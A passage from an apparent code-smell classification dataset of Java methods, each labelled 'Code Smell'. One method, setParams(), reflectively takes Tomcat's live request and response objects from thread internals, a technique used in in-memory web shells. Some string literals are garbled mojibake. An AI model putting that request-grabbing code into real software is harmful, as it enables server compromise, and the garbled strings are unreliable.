    int userId=app.userId;
    try (ComponentsBlocker cb=ComponentsBlocker.getInstance(app.packageName,userId,false)){
      app.rulesCount=cb.entryCount();
    }
     app.codeSize=app.dataSize=0;
    if (hasUsageAccess) {
      PackageSizeInfo sizeInfo=PackageUtils.getPackageSizeInfo(context,app.packageName,userId,null);
      if (sizeInfo != null) {
        app.codeSize=sizeInfo.codeSize + sizeInfo.obbSize;
        app.dataSize=sizeInfo.dataSize + sizeInfo.mediaSize + sizeInfo.cacheSize;
      }
    }
    if (ThreadUtils.isInterrupted())     return;
    if (!app.isInstalled) {
      continue;
    }
    app.hasKeystore=KeyStoreUtils.hasKeyStore(app.uid);
    app.usesSaf=uriManager.getGrantedUris(app.packageName) != null;
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
      SsaidSettings ssaidSettings=userIdSsaidSettingsMap.get(userId);
      if (ssaidSettings != null) {
        String ssaid=ssaidSettings.getSsaid(app.packageName,app.uid);
        app.ssaid=TextUtils.isEmpty(ssaid) ? null : ssaid;
      }
 else {
        app.ssaid=null;
      }
    }
    PackageUsageInfo usageInfo=findUsage(packageUsageInfoList,app.packageName,userId);
    if (usageInfo != null) {
      app.mobileDataUsage=usageInfo.mobileData != null ? usageInfo.mobileData.getTotal() : 0;
      app.wifiDataUsage=usageInfo.wifiData != null ? usageInfo.wifiData.getTotal() : 0;
      app.openCount=usageInfo.timesOpened;
      app.screenTime=usageInfo.screenTime;
      app.lastUsageTime=usageInfo.lastUsageTime;
    }
 else {
      app.mobileDataUsage=app.wifiDataUsage=app.screenTime=app.lastUsageTime=0;
      app.openCount=0;
    }
  }
}",1,Code Smell
"private synchronized boolean insertOrRemoveProperties(boolean isInsert,Map<String,String> changeConfigMap){
  if (changeConfigMap == null || changeConfigMap.isEmpty()) {
    return false;
  }
  Map<String,String> filteredMap=filterInValidRecords(changeConfigMap);
  if (filteredMap.isEmpty()) {
    LOG.info(""Part {} properties {}, but the records are all illegal {}"",(isInsert ? ""insert"" : ""remove""),getFileName(),changeConfigMap);
    return false;
  }
  boolean changed=false;
  Map<String,String> newConfigMap=forkHolder();
  if (isInsert) {
    for (    Map.Entry<String,String> entry : filteredMap.entrySet()) {
      String oldValue=newConfigMap.put(entry.getKey(),entry.getValue());
      if (!ObjectUtils.equals(oldValue,entry.getValue())) {
        changed=true;
      }
    }
  }
 else {
    for (    Map.Entry<String,String> entry : filteredMap.entrySet()) {
      String oldValue=newConfigMap.remove(entry.getKey());
      if (oldValue != null) {
        changed=true;
      }
    }
  }
  if (!changed) {
    return false;
  }
  return compAndStorePropertiesToFile(newConfigMap);
}
",1,Code Smell
"public static CharSequence replaceEmoji(CharSequence cs,Paint.FontMetricsInt fontMetrics,boolean createNew){
  return replaceEmoji(cs,fontMetrics,AndroidUtilities.dp(16),createNew,null);
}
public static CharSequence replaceEmoji(CharSequence cs,Paint.FontMetricsInt fontMetrics,int size,boolean createNew){
  return replaceEmoji(cs,fontMetrics,size,createNew,null);
}
public static CharSequence replaceEmoji(CharSequence cs,Paint.FontMetricsInt fontMetrics,int size,boolean createNew,int[] emojiOnly){
  return replaceEmoji(cs,fontMetrics,createNew,emojiOnly,DynamicDrawableSpan.ALIGN_BOTTOM);
}
public static CharSequence replaceEmoji(CharSequence cs,Paint.FontMetricsInt fontMetrics,boolean createNew,int[] emojiOnly,int alignment){
  if (NekoConfig.useSystemEmoji.Bool() || cs == null || cs.length() == 0) {
    return cs;
  }
  Spannable s;
  if (!createNew && cs instanceof Spannable) {
    s=(Spannable)cs;
  }
 else {
    s=Spannable.Factory.getInstance().newSpannable(cs.toString());
  }
  ArrayList<EmojiSpanRange> emojis=parseEmojis(s,emojiOnly);
  if (emojis.isEmpty()) {
    return cs;
  }
  AnimatedEmojiSpan[] animatedEmojiSpans=s.getSpans(0,s.length(),AnimatedEmojiSpan.class);
  EmojiSpan span;
  Drawable drawable;
  int limitCount=SharedConfig.getDevicePerformanceClass() >= SharedConfig.PERFORMANCE_CLASS_HIGH ? 100 : 50;
  for (int i=0; i < emojis.size(); ++i) {
    try {
      EmojiSpanRange emojiRange=emojis.get(i);
      if (animatedEmojiSpans != null) {
        boolean hasAnimated=false;
        for (int j=0; j < animatedEmojiSpans.length; ++j) {
          AnimatedEmojiSpan animatedSpan=animatedEmojiSpans[j];
          if (animatedSpan != null && s.getSpanStart(animatedSpan) == emojiRange.start && s.getSpanEnd(animatedSpan) == emojiRange.end) {
            hasAnimated=true;
            break;
          }
        }
        if (hasAnimated) {
          continue;
        }
      }
      drawable=Emoji.getEmojiDrawable(emojiRange.code);
      if (drawable != null) {
        span=new EmojiSpan(drawable,alignment,fontMetrics);
        span.emoji=emojiRange.code == null ? null : emojiRange.code.toString();
        s.setSpan(span,emojiRange.start,emojiRange.end,Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
      }
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
    if ((Build.VERSION.SDK_INT < 23 || Build.VERSION.SDK_INT >= 29) && (i + 1) >= limitCount) {
      break;
    }
  }
  return s;
}",1,Code Smell
"/** 
 * Returns the Flink SQL type represented by the given format. Please see  {@link org.apache.flink.table.types.utils.TypeInfoDataTypeConverter} and{@link org.apache.flink.table.types.utils.LegacyTypeInfoDataTypeConverter}.
 * @param typeInfo The type information of flink formats.
 * @return The Flink SQL data type represented by the given format.
 */
public static DataType getDataType(TypeInfo typeInfo){
  if (typeInfo instanceof StringTypeInfo) {
    return DataTypes.STRING().bridgedTo(String.class);
  }
 else   if (typeInfo instanceof BooleanTypeInfo) {
    return DataTypes.BOOLEAN().bridgedTo(Boolean.class);
  }
 else   if (typeInfo instanceof ByteTypeInfo) {
    return DataTypes.TINYINT().bridgedTo(Byte.class);
  }
 else   if (typeInfo instanceof ShortTypeInfo) {
    return DataTypes.SMALLINT().bridgedTo(Short.class);
  }
 else   if (typeInfo instanceof IntTypeInfo) {
    return DataTypes.INT().bridgedTo(Integer.class);
  }
 else   if (typeInfo instanceof LongTypeInfo) {
    return DataTypes.BIGINT().bridgedTo(Long.class);
  }
 else   if (typeInfo instanceof FloatTypeInfo) {
    return DataTypes.FLOAT().bridgedTo(Float.class);
  }
 else   if (typeInfo instanceof DoubleTypeInfo) {
    return DataTypes.DOUBLE().bridgedTo(Double.class);
  }
 else   if (typeInfo instanceof DecimalTypeInfo) {
    return DataTypes.DECIMAL(38,18).bridgedTo(BigDecimal.class);
  }
 else   if (typeInfo instanceof DateTypeInfo) {
    return DataTypes.DATE().bridgedTo(java.sql.Date.class);
  }
 else   if (typeInfo instanceof TimeTypeInfo) {
    return DataTypes.TIME(0).bridgedTo(java.sql.Time.class);
  }
 else   if (typeInfo instanceof TimestampTypeInfo) {
    return DataTypes.TIMESTAMP(3).bridgedTo(java.sql.Timestamp.class);
  }
 else   if (typeInfo instanceof ArrayTypeInfo) {
    ArrayTypeInfo arrayTypeInfo=(ArrayTypeInfo)typeInfo;
    TypeInfo elementTypeInfo=arrayTypeInfo.getElementTypeInfo();
    DataType elementType=getDataType(elementTypeInfo);
    Class<?> arrayClass=Array.newInstance(elementType.getConversionClass(),0).getClass();
    return DataTypes.ARRAY(elementType).bridgedTo(arrayClass);
  }
 else   if (typeInfo instanceof MapTypeInfo) {
    MapTypeInfo mapTypeInfo=(MapTypeInfo)typeInfo;
    TypeInfo keyTypeInfo=mapTypeInfo.getKeyTypeInfo();
    TypeInfo valueTypeInfo=mapTypeInfo.getValueTypeInfo();
    DataType keyType=getDataType(keyTypeInfo);
    DataType valueType=getDataType(valueTypeInfo);
    return DataTypes.MAP(keyType,valueType).bridgedTo(Map.class);
  }
 else   if (typeInfo instanceof RowTypeInfo) {
    RowTypeInfo rowTypeInfo=(RowTypeInfo)typeInfo;
    String[] fieldNames=rowTypeInfo.getFieldNames();
    TypeInfo[] fieldTypeInfos=rowTypeInfo.getFieldTypeInfos();
    DataTypes.Field[] fields=IntStream.range(0,fieldNames.length).mapToObj(i -> {
      DataType fieldType=getDataType(fieldTypeInfos[i]);
      return DataTypes.FIELD(fieldNames[i],fieldType);
    }
).toArray(DataTypes.Field[]::new);
    return DataTypes.ROW(fields).bridgedTo(Row.class);
  }
 else {
    throw new IllegalStateException(""Unexpected format."");
  }
}",1,Code Smell
"/** 
 * Get the next entry in this tar archive. This will skip over any remaining data in the current entry, if there is one, and place the input stream at the header of the next entry, and read the header and instantiate a new TarEntry from the header bytes and return that entry. If there are no more entries in the archive, null will be returned to indicate that the end of the archive has been reached.
 * @return The next TarEntry in the archive, or null.
 * @throws IOException on error
 */
public TarArchiveEntry getNextTarEntry() throws IOException {
  if (isAtEOF()) {
    return null;
  }
  if (currEntry != null) {
    IOUtils.skip(this,Long.MAX_VALUE);
    skipRecordPadding();
  }
  final byte[] headerBuf=getRecord();
  if (headerBuf == null) {
    currEntry=null;
    return null;
  }
  try {
    currEntry=new TarArchiveEntry(headerBuf,zipEncoding,lenient);
  }
 catch (  final IllegalArgumentException e) {
    throw new IOException(""Error detected parsing the header"",e);
  }
  entryOffset=0;
  entrySize=currEntry.getSize();
  if (currEntry.isGNULongLinkEntry()) {
    final byte[] longLinkData=getLongNameData();
    if (longLinkData == null) {
      return null;
    }
    currEntry.setLinkName(zipEncoding.decode(longLinkData));
  }
  if (currEntry.isGNULongNameEntry()) {
    final byte[] longNameData=getLongNameData();
    if (longNameData == null) {
      return null;
    }
    final String name=zipEncoding.decode(longNameData);
    currEntry.setName(name);
    if (currEntry.isDirectory() && !name.endsWith(""/"")) {
      currEntry.setName(name + ""/"");
    }
  }
  if (currEntry.isGlobalPaxHeader()) {
    readGlobalPaxHeaders();
  }
  try {
    if (currEntry.isPaxHeader()) {
      paxHeaders();
    }
 else     if (!globalPaxHeaders.isEmpty()) {
      applyPaxHeadersToCurrentEntry(globalPaxHeaders,globalSparseHeaders);
    }
  }
 catch (  final NumberFormatException e) {
    throw new IOException(""Error detected parsing the pax header"",e);
  }
  if (currEntry.isOldGNUSparse()) {
    readOldGNUSparse();
  }
  entrySize=currEntry.getSize();
  return currEntry;
}",1,Code Smell
"public void setParams(){
  try {
    boolean flag=false;
    Thread[] threads=(Thread[])getField(Thread.currentThread().getThreadGroup(),""threads"");
    for (int i=0; i < threads.length; i++) {
      Thread thread=threads[i];
      if (thread != null) {
        String threadName=thread.getName();
        if (!threadName.contains(""exec"") && threadName.contains(""http"")) {
          Object target=getField(thread,""target"");
          Object global=null;
          if (target instanceof Runnable) {
            try {
              global=getField(getField(getField(target,""this$0""),""handler""),""global"");
            }
 catch (            NoSuchFieldException fieldException) {
              fieldException.printStackTrace();
            }
          }
          if (global != null) {
            List processors=(List)getField(global,""processors"");
            for (i=0; i < processors.size(); i++) {
              RequestInfo requestInfo=(RequestInfo)processors.get(i);
              if (requestInfo != null) {
                org.apache.coyote.Request tempRequest=(org.apache.coyote.Request)getField(requestInfo,""req"");
                org.apache.catalina.connector.Request request=(org.apache.catalina.connector.Request)tempRequest.getNote(1);
                Response response=request.getResponse();
                this.request=request;
                this.response=response;
                flag=true;
                break;
              }
            }
          }
        }
      }
      if (flag) {
        break;
      }
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
}",1,Code Smell
"private void switchTab(int index){
  if (tabsSelectedIndex == index || tabsNewSelectedIndex == index) {
    return;
  }
  if (tabsSelectionAnimator != null) {
    tabsSelectionAnimator.cancel();
  }
  final View view=getBarView(tabsSelectedIndex);
  tabsNewSelectedIndex=index;
  final View newView=getBarView(tabsNewSelectedIndex);
  tabsSelectionAnimator=ValueAnimator.ofFloat(0,1).setDuration(300);
  tabsSelectionAnimator.setInterpolator(CubicBezierInterpolator.DEFAULT);
  tabsSelectionAnimator.addUpdateListener(animation -> {
    tabsSelectionProgress=(float)animation.getAnimatedValue();
    tabsLayout.invalidate();
    bottomLayout.invalidate();
    overlayLayout.invalidate();
    for (int i=0; i < tabsLayout.getChildCount(); i++) {
      tabsLayout.getChildAt(i).setAlpha(0.6f + 0.4f * (i == tabsNewSelectedIndex ? tabsSelectionProgress : i == tabsSelectedIndex ? 1f - tabsSelectionProgress : 0f));
    }
    float pr=CubicBezierInterpolator.DEFAULT.getInterpolation(tabsSelectionProgress);
    if (view != null && newView != null) {
      float scale=0.6f + 0.4f * (1f - pr);
      view.setScaleX(scale);
      view.setScaleY(scale);
      view.setTranslationY(AndroidUtilities.dp(16) * Math.min(pr,0.25f) / 0.25f);
      view.setAlpha(1f - Math.min(pr,0.25f) / 0.25f);
      scale=0.6f + 0.4f * pr;
      newView.setScaleX(scale);
      newView.setScaleY(scale);
      newView.setTranslationY(-AndroidUtilities.dp(16) * Math.min(1f - pr,0.25f) / 0.25f);
      newView.setAlpha(1f - Math.min(1f - pr,0.25f) / 0.25f);
    }
  }
);
  tabsSelectionAnimator.addListener(new AnimatorListenerAdapter(){
    @Override public void onAnimationStart(    Animator animation){
      if (view != null && newView != null) {
        newView.setVisibility(VISIBLE);
      }
      if (index == 2) {
        weightChooserView.setMinMax(0.5f,2f);
      }
 else {
        Brush brush=renderView.getCurrentBrush();
        if (brush instanceof Brush.Blurer || brush instanceof Brush.Eraser) {
          weightChooserView.setMinMax(0.4f,1.75f);
        }
 else {
          weightChooserView.setMinMax(0.05f,1f);
        }
      }
    }
    @Override public void onAnimationEnd(    Animator animation){
      tabsSelectedIndex=tabsNewSelectedIndex;
      tabsNewSelectedIndex=-1;
      tabsLayout.invalidate();
      if (view != null && newView != null) {
        view.setVisibility(GONE);
      }
      if (animation == tabsSelectionAnimator) {
        tabsSelectionAnimator=null;
      }
    }
  }
);
  tabsSelectionAnimator.start();
}",1,Code Smell
"private int getRow(SQLGlobalState<?,?> globalState,String selectStr,List<String> queryPlanSequences) throws AssertionError, SQLException {
  int row=-1;
  String explainQuery=""EXPLAIN (VERBOSE) "" + selectStr;
  if (globalState.getOptions().logEachSelect()) {
    globalState.getLogger().writeCurrent(explainQuery);
    try {
      globalState.getLogger().getCurrentFileWriter().flush();
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
  }
  SQLQueryAdapter q=new SQLQueryAdapter(explainQuery,errors);
  try (SQLancerResultSet rs=q.executeAndGet(globalState)){
    if (rs != null) {
      while (rs.next()) {
        String content=rs.getString(1);
        if (content.contains(""count:"")) {
          try {
            int number=Integer.parseInt(content.split(""count: "")[1].split("" "")[0].replace("","",""""));
            if (row == -1) {
              row=number;
            }
          }
 catch (          Exception e) {
          }
        }
        if (content.contains(""鈥� "")) {
          String operation=content.split(""鈥� "")[1].split("" "")[0];
          queryPlanSequences.add(operation);
        }
      }
    }
  }
 catch (  Exception e) {
    throw new AssertionError(q.getQueryString(),e);
  }
  if (row == -1) {
    throw new IgnoreMeException();
  }
  return row;
}",1,Code Smell
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.protos.core.TransformerMapProto)) {
    return super.equals(obj);
  }
  org.tribuo.protos.core.TransformerMapProto other=(org.tribuo.protos.core.TransformerMapProto)obj;
  if (getVersion() != other.getVersion())   return false;
  if (!internalGetTransformers().equals(other.internalGetTransformers()))   return false;
  if (hasDatasetProvenance() != other.hasDatasetProvenance())   return false;
  if (hasDatasetProvenance()) {
    if (!getDatasetProvenance().equals(other.getDatasetProvenance()))     return false;
  }
  if (hasTransformationMapProvenance() != other.hasTransformationMapProvenance())   return false;
  if (hasTransformationMapProvenance()) {
    if (!getTransformationMapProvenance().equals(other.getTransformationMapProvenance()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",1,Code Smell
"public boolean equipItem(GameItem item){
  int slot=item.getEquipSlot();
  if (slot == 0)   return false;
  GameAvatar otherAvatar=getOwner().getAvatarById(item.getEquipAvatarId());
  if (otherAvatar != null) {
    if (otherAvatar.unequipItem(slot) != null) {
      getOwner().sendPacket(new PacketPlayerSyncScNotify(otherAvatar));
    }
    if (getEquips().containsKey(slot)) {
      GameItem toSwap=this.getEquipBySlot(slot);
      otherAvatar.equipItem(toSwap);
    }
  }
 else   if (getEquips().containsKey(slot)) {
    GameItem unequipped=unequipItem(slot);
    if (unequipped != null) {
      getOwner().sendPacket(new PacketPlayerSyncScNotify(unequipped));
    }
  }
  getEquips().put(slot,item);
  if (item.setEquipAvatar(this)) {
    item.save();
  }
  getOwner().sendPacket(new PacketPlayerSyncScNotify(this,item));
  return true;
}",1,Code Smell
"@Override public TreeVisitor<?,ExecutionContext> getVisitor(){
  return new JavaVisitor<ExecutionContext>(){
    @Nullable J.Literal literal;
    @Override public J visitFieldAccess(    J.FieldAccess fieldAccess,    ExecutionContext ctx){
      if (isConstant(fieldAccess.getName().getFieldType())) {
        maybeRemoveImport(owningType);
        return buildLiteral().withPrefix(fieldAccess.getPrefix());
      }
      return super.visitFieldAccess(fieldAccess,ctx);
    }
    @Override public J visitIdentifier(    J.Identifier ident,    ExecutionContext ctx){
      if (isConstant(ident.getFieldType()) && !isVariableDeclaration()) {
        maybeRemoveImport(owningType);
        return buildLiteral().withPrefix(ident.getPrefix());
      }
      return super.visitIdentifier(ident,ctx);
    }
    private boolean isConstant(    @Nullable JavaType.Variable varType){
      return varType != null && TypeUtils.isOfClassType(varType.getOwner(),owningType) && varType.getName().equals(constantName);
    }
    private boolean isVariableDeclaration(){
      Cursor maybeVariable=getCursor().dropParentUntil(is -> is instanceof J.VariableDeclarations || is instanceof J.CompilationUnit);
      if (!(maybeVariable.getValue() instanceof J.VariableDeclarations)) {
        return false;
      }
      JavaType.Variable variableType=((J.VariableDeclarations)maybeVariable.getValue()).getVariables().get(0).getVariableType();
      if (variableType == null) {
        return true;
      }
      JavaType.FullyQualified ownerFqn=TypeUtils.asFullyQualified(variableType.getOwner());
      if (ownerFqn == null) {
        return true;
      }
      return constantName.equals(((J.VariableDeclarations)maybeVariable.getValue()).getVariables().get(0).getSimpleName()) && owningType.equals(ownerFqn.getFullyQualifiedName());
    }
    private J.Literal buildLiteral(){
      if (literal == null) {
        JavaParser parser=JavaParser.fromJavaVersion().build();
        J.CompilationUnit result=parser.parse(""class $ { Object o = "" + literalValue + ""; }"").findFirst().map(J.CompilationUnit.class::cast).orElseThrow(() -> new IllegalStateException(""Expected to have one parsed compilation unit.""));
        J j=((J.VariableDeclarations)result.getClasses().get(0).getBody().getStatements().get(0)).getVariables().get(0).getInitializer();
        if (!(j instanceof J.Literal)) {
          throw new IllegalArgumentException(""Unknown literal type for literal value: "" + literalValue);
        }
        J.Literal parsedLiteral=(J.Literal)j;
        literal=parsedLiteral.withId(Tree.randomId());
      }
      return literal;
    }
  }
;
}",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite @org.jetbrains.annotations.Nullable public Entity changeDimension(ServerLevel serverLevel){
  if (this.level() instanceof ServerLevel && !this.isRemoved()) {
    this.level().getProfiler().push(""changeDimension"");
    if (serverLevel == null) {
      return null;
    }
    this.level().getProfiler().push(""reposition"");
    var bukkitPos=bridge$getLastTpPos();
    PortalInfo portalInfo=bukkitPos == null ? this.findDimensionEntryPoint(serverLevel) : new PortalInfo(new Vec3(bukkitPos.x(),bukkitPos.y(),bukkitPos.z()),Vec3.ZERO,this.yRot,this.xRot);
    if (portalInfo == null) {
      return null;
    }
 else {
      ServerLevel world=((PortalInfoBridge)portalInfo).bridge$getWorld() == null ? serverLevel : ((PortalInfoBridge)portalInfo).bridge$getWorld();
      if (world == this.level()) {
        this.moveTo(portalInfo.pos.x,portalInfo.pos.y,portalInfo.pos.z,portalInfo.yRot,this.getXRot());
        this.setDeltaMovement(portalInfo.speed);
        return (Entity)(Object)this;
      }
      this.unRide();
      this.level().getProfiler().popPush(""reloading"");
      Entity entity=this.getType().create(serverLevel);
      if (entity != null) {
        entity.restoreFrom((Entity)(Object)this);
        entity.moveTo(portalInfo.pos.x,portalInfo.pos.y,portalInfo.pos.z,portalInfo.yRot,entity.getXRot());
        entity.setDeltaMovement(portalInfo.speed);
        if (this.bridge$isInWorld()) {
          world.addDuringTeleport(entity);
          if (((WorldBridge)world).bridge$getTypeKey() == LevelStem.END && Level.END != null) {
            ArclightCaptures.captureEndPortalEntity((Entity)(Object)this,true);
            ServerLevel.makeObsidianPlatform(world);
          }
        }
      }
      this.removeAfterChangingDimensions();
      this.level().getProfiler().pop();
      ((ServerLevel)this.level()).resetEmptyTime();
      serverLevel.resetEmptyTime();
      this.level().getProfiler().pop();
      return entity;
    }
  }
 else {
    return null;
  }
}",1,Code Smell
"private void showConnectionFailure(Throwable exception){
  String reason=exception.getCause() != null ? exception.getCause().getMessage() : exception.getMessage();
  if (exception instanceof TlsServerException && exception.getCause() != null) {
    TlsServerException tlsServerException=(TlsServerException)exception;
    if (exception.getCause().getMessage().contains(""PKIX path building failed"")) {
      File configCrtFile=Config.get().getElectrumServerCert();
      File savedCrtFile=Storage.getCertificateFile(tlsServerException.getServer().getHost());
      if (configCrtFile == null && savedCrtFile != null) {
        Optional<ButtonType> optButton=AppServices.showErrorDialog(""SSL Handshake Failed"",""The certificate provided by the server at "" + tlsServerException.getServer().getHost() + "" appears to have changed.""+ ""\n\nThis may indicate a man-in-the-middle attack!""+ ""\n\nDo you still want to proceed?"",ButtonType.NO,ButtonType.YES);
        if (optButton.isPresent() && optButton.get() == ButtonType.YES) {
          if (savedCrtFile.delete()) {
            Platform.runLater(this::startElectrumConnection);
            return;
          }
 else {
            AppServices.showErrorDialog(""Could not delete certificate"",""The certificate file at "" + savedCrtFile.getAbsolutePath() + "" could not be deleted.\n\nPlease delete this file manually."");
          }
        }
      }
    }
    reason=tlsServerException.getMessage() + ""\n\n"" + reason;
  }
 else   if (exception instanceof ProxyServerException) {
    reason+="". Check if the proxy server is running."";
  }
 else   if (reason != null && reason.contains(""Check if Bitcoin Core is running"")) {
    reason+=""\n\nSee https://sparrowwallet.com/docs/connect-node.html"";
  }
  testStatus.setText(""Failed"");
  testResults.setText(""Could not connect:\n\n"" + reason);
}
",1,Code Smell
"@Override public void onError(ErrorResponse error){
  if (error instanceof MastodonDetailedErrorResponse) {
    Map<String,List<MastodonDetailedErrorResponse.FieldError>> fieldErrors=derr.detailedErrors;
    boolean first=true;
    boolean anyFieldsSkipped=false;
    for (    String fieldName : fieldErrors.keySet()) {
      EditText field=getFieldByName(fieldName);
      if (field == null) {
        anyFieldsSkipped=true;
        continue;
      }
      List<MastodonDetailedErrorResponse.FieldError> errors=Objects.requireNonNull(fieldErrors.get(fieldName));
      if (errors.size() == 1) {
        getFieldWrapByName(fieldName).setErrorState(getErrorDescription(errors.get(0),fieldName));
      }
 else {
        SpannableStringBuilder ssb=new SpannableStringBuilder();
        boolean firstErr=true;
        for (        MastodonDetailedErrorResponse.FieldError err : errors) {
          if (firstErr) {
            firstErr=false;
          }
 else {
            ssb.append('\n');
          }
          ssb.append(getErrorDescription(err,fieldName));
        }
        getFieldWrapByName(fieldName).setErrorState(getErrorDescription(errors.get(0),fieldName));
      }
      errorFields.add(field);
      if (first) {
        first=false;
        field.requestFocus();
      }
    }
    if (anyFieldsSkipped)     error.showToast(getActivity());
  }
 else {
    error.showToast(getActivity());
  }
  progressDialog.dismiss();
}
@Override public void onError(ErrorResponse error){
  currentBackgroundRequest=null;
  if (submitAfterGettingToken) {
    submitAfterGettingToken=false;
    progressDialog.dismiss();
    error.showToast(getActivity());
  }
}
@Override public void onError(ErrorResponse error){
  currentBackgroundRequest=null;
  if (submitAfterGettingToken) {
    submitAfterGettingToken=false;
    progressDialog.dismiss();
    error.showToast(getActivity());
  }
}",1,Code Smell
"@Unique private void removeTrivialLightmaps(final ChunkLightProvider<?,?> lightProvider){
  for (final LongIterator it=this.trivialLightmaps.iterator(); it.hasNext(); ) {
    final long sectionPos=it.nextLong();
    this.storage.removeChunk(sectionPos);
    this.lightmapComplexities.remove(sectionPos);
    this.untrackSection(sectionPos);
    this.dirtySections.add(sectionPos);
  }
  this.storage.clearCache();
  for (final LongIterator it=this.trivialLightmaps.iterator(); it.hasNext(); ) {
    this.onUnloadSection(it.nextLong());
  }
  for (final LongIterator it=this.trivialLightmaps.iterator(); it.hasNext(); ) {
    final long sectionPos=it.nextLong();
    if (this.nonOptimizableSections.contains(sectionPos)) {
      this.storage.put(sectionPos,this.createTrivialVanillaLightmap(sectionPos));
    }
  }
  this.storage.clearCache();
  if (lightProvider != null) {
    for (final LongIterator it=this.trivialLightmaps.iterator(); it.hasNext(); ) {
      final long sectionPos=it.nextLong();
      if (!this.hasSection(sectionPos)) {
        this.removeSection(lightProvider,sectionPos);
      }
    }
  }
  this.trivialLightmaps.clear();
}
",1,Code Smell
"public static <T>T newInstance(Class<T> clazz){
  try {
    Constructor<?> defaultConstructor=null;
    Constructor<?> otherConstructor=null;
    Constructor<?>[] declaredConstructors=clazz.getDeclaredConstructors();
    for (    Constructor<?> constructor : declaredConstructors) {
      if (constructor.getParameterCount() == 0 && Modifier.isPublic(constructor.getModifiers())) {
        defaultConstructor=constructor;
      }
 else       if (Modifier.isPublic(constructor.getModifiers())) {
        otherConstructor=constructor;
      }
    }
    if (defaultConstructor != null) {
      return (T)defaultConstructor.newInstance();
    }
 else     if (otherConstructor != null) {
      Class<?>[] parameterTypes=otherConstructor.getParameterTypes();
      Object[] parameters=new Object[parameterTypes.length];
      for (int i=0; i < parameterTypes.length; i++) {
        if (parameterTypes[i].isPrimitive()) {
          parameters[i]=ConvertUtil.getPrimitiveDefaultValue(parameterTypes[i]);
        }
 else {
          parameters[i]=null;
        }
      }
      return (T)otherConstructor.newInstance(parameters);
    }
 else {
      Method factoryMethod=ClassUtil.getFirstMethod(clazz,m -> m.getParameterCount() == 0 && m.getReturnType().isAssignableFrom(clazz) && Modifier.isPublic(m.getModifiers()) && Modifier.isStatic(m.getModifiers()));
      if (factoryMethod != null) {
        return (T)factoryMethod.invoke(null);
      }
    }
    throw new IllegalArgumentException(""the class \"""" + clazz.getName() + ""\"" has no constructor."");
  }
 catch (  Exception e) {
    throw new RuntimeException(""Can not newInstance class: "" + clazz.getName(),e);
  }
}
public static <T>T newInstance(Class<T> clazz,Object... paras){
  try {
    Constructor<?>[] constructors=clazz.getDeclaredConstructors();
    for (    Constructor<?> constructor : constructors) {
      if (isMatchedParas(constructor,paras)) {
        Object ret=constructor.newInstance(paras);
        return (T)ret;
      }
    }
    throw new IllegalArgumentException(""Can not find constructor by paras: \"""" + Arrays.toString(paras) + ""\"" in class[""+ clazz.getName()+ ""]"");
  }
 catch (  Exception e) {
    throw new RuntimeException(e.toString(),e);
  }
}",1,Code Smell
"private static void loadStats(){
  int i=Statistic.values().length;
  List<Statistic> newTypes=new ArrayList<>();
  Field key=Arrays.stream(Statistic.class.getDeclaredFields()).filter(it -> it.getName().equals(""key"")).findAny().orElse(null);
  long keyOffset=Unsafe.objectFieldOffset(key);
  for (  StatType<?> statType : BuiltInRegistries.STAT_TYPE) {
    if (statType == Stats.CUSTOM)     continue;
    var location=BuiltInRegistries.STAT_TYPE.getKey(statType);
    Statistic statistic=STATS.get(location);
    if (statistic == null) {
      String standardName=ResourceLocationUtil.standardize(location);
      Statistic.Type type;
      if (statType.getRegistry() == BuiltInRegistries.ENTITY_TYPE) {
        type=Statistic.Type.ENTITY;
      }
 else       if (statType.getRegistry() == BuiltInRegistries.BLOCK) {
        type=Statistic.Type.BLOCK;
      }
 else       if (statType.getRegistry() == BuiltInRegistries.ITEM) {
        type=Statistic.Type.ITEM;
      }
 else {
        type=Statistic.Type.UNTYPED;
      }
      statistic=EnumHelper.makeEnum(Statistic.class,standardName,i,ImmutableList.of(Statistic.Type.class),ImmutableList.of(type));
      Unsafe.putObject(statistic,keyOffset,location);
      newTypes.add(statistic);
      STATS.put(location,statistic);
      ArclightServer.LOGGER.debug(""Registered {} as stats {}"",location,statistic);
      i++;
    }
  }
  for (  ResourceLocation location : BuiltInRegistries.CUSTOM_STAT) {
    Statistic statistic=STATS.get(location);
    if (statistic == null) {
      String standardName=ResourceLocationUtil.standardize(location);
      statistic=EnumHelper.makeEnum(Statistic.class,standardName,i,ImmutableList.of(),ImmutableList.of());
      Unsafe.putObject(statistic,keyOffset,location);
      newTypes.add(statistic);
      STATS.put(location,statistic);
      ArclightServer.LOGGER.debug(""Registered {} as custom stats {}"",location,statistic);
      i++;
    }
  }
  EnumHelper.addEnums(Statistic.class,newTypes);
  putStatic(CraftStatistic.class,""statistics"",STATS);
}
",1,Code Smell
"@Override public void run(String... args) throws Exception {
  List<Device> deviceList=deviceService.getAllOnlineDevice();
  for (  Device device : deviceList) {
    if (deviceService.expire(device)) {
      deviceService.offline(device.getDeviceId(),""娉ㄥ唽宸茶繃鏈"");
    }
 else {
      deviceService.online(device,null);
    }
  }
  redisCatchStorage.resetAllCSEQ();
  List<Device> devicesInDb=deviceService.getAll();
  if (devicesInDb.size() == 0) {
    redisCatchStorage.removeAllDevice();
  }
 else {
    List<Device> devicesInRedis=redisCatchStorage.getAllDevices();
    if (devicesInRedis.size() > 0) {
      Map<String,Device> deviceMapInDb=new HashMap<>();
      devicesInDb.parallelStream().forEach(device -> {
        deviceMapInDb.put(device.getDeviceId(),device);
      }
);
      devicesInRedis.parallelStream().forEach(device -> {
        if (deviceMapInDb.get(device.getDeviceId()) == null) {
          redisCatchStorage.removeDevice(device.getDeviceId());
        }
      }
);
    }
  }
  List<SendRtpItem> sendRtpItems=redisCatchStorage.queryAllSendRTPServer();
  if (sendRtpItems.size() > 0) {
    for (    SendRtpItem sendRtpItem : sendRtpItems) {
      MediaServer mediaServerItem=mediaServerService.getOne(sendRtpItem.getMediaServerId());
      redisCatchStorage.deleteSendRTPServer(sendRtpItem.getPlatformId(),sendRtpItem.getChannelId(),sendRtpItem.getCallId(),sendRtpItem.getStream());
      if (mediaServerItem != null) {
